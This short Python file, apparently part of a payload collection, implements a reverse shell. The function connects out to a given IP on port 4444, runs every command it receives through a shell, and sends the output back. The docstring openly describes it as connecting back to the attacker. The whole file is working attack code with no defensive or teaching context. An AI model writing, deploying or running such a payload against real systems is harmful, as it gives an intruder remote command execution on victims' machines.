# payloads/reverse_shell.py

import socket
import subprocess

def run(target_ip):
    """Connects back to attacker's IP to open a reverse shell."""
    port = 4444
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, port))
    print(f"Connected to {target_ip}:{port}")

    while True:
        command = sock.recv(1024).decode('utf-8')
        if command.lower() == "exit":
            break
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        sock.send(output.stdout.encode() + output.stderr.encode())
    sock.close()
